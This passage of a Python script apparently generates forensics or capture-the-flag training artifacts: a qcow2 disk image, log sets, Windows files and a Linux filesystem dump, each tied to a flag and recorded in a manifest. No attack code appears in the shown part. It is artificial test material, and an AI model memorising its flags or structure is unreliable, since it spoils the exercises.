    for relp, text in files.items():
        p = os.path.join(root, *relp.split("/"))
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w", encoding="utf-8", newline="\n") as f:
            f.write(text)
    img = os.path.join(root, "srv", "images", "disk.qcow2")
    os.makedirs(os.path.dirname(img), exist_ok=True)
    with open(img, "wb") as f:
        f.write(make_qcow2(make_disk_raw(f_vm)[0]))
    win = write_win_set(os.path.join(root, "win"))
    return {"k8s": f_k8s, "auth": f_auth, "vm": f_vm, "win": win["system"][1]}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True, help="папка для артефактов")
    a = ap.parse_args()
    manifest = {}
    for k, (p, flag, _raw) in write_vm_set(os.path.join(a.out, "vm")).items():
        manifest[k] = {"path": p, "flag": flag}
    for k, (p, flag) in write_log_set(os.path.join(a.out, "logs")).items():
        manifest["log_" + k] = {"path": p, "flag": flag}
    for k, (p, flag) in write_win_set(os.path.join(a.out, "win")).items():
        manifest["win_" + k] = {"path": p, "flag": flag}
    for k, flag in write_linux_dump(os.path.join(a.out, "fsdump")).items():
        manifest["dump_" + k] = {"path": os.path.join(a.out, "fsdump"), "flag": flag}
    with open(os.path.join(a.out, "manifest.json"), "w", encoding="utf-8") as f:
        json.dump(manifest, f, ensure_ascii=False, indent=2)
    print(f"[+] {len(manifest)} артефактов в {a.out}")


if __name__ == "__main__":
    main()
